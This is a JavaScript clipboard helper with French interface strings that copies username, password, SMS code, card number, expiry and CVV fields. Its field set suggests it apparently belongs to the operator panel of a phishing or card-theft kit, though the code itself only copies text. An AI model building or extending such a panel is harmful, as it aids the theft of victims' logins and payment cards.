    <script>
        function copyToClipboard(element, type) {
            let text = '';
            if (type === 'username') {
                text = element.innerText.replace('Username:', '').replace('Cliquez pour copier', '').trim();
            } else if (type === 'password') {
                text = element.innerText.replace('Password:', '').replace('Cliquez pour copier', '').trim();
            } else if (type === 'sms_code') {
                text = element.innerText.replace('SMS Code:', '').replace('Cliquez pour copier', '').trim();
            } else if (type === 'card_number') {
                text = element.innerText.replace('Card Number:', '').replace('Cliquez pour copier', '').trim();
            } else if (type === 'expiry') {
                text = element.innerText.replace('Expiry MM/AA:', '').replace('Cliquez pour copier', '').trim();
            } else if (type === 'cvv') {
                text = element.innerText.replace('CVV:', '').replace('Cliquez pour copier', '').trim();
            }
            
            navigator.clipboard.writeText(text).then(function() {
                const originalBackground = element.style.background;
                const originalHTML = element.innerHTML;
                
                element.innerHTML = '<strong> Copied!</strong>';
                element.style.background = 'rgba(76, 175, 80, 0.4)';
                element.style.border = '1px solid #4caf50';
                
                setTimeout(() => {
                    element.innerHTML = originalHTML;
                    element.style.background = originalBackground;
                    element.style.border = '1px dashed rgba(255,255,255,0.3)';
                }, 2000);
            }).catch(function(err) {
                console.error('Erreur de copie: ', err);
            });
        }
    </script>
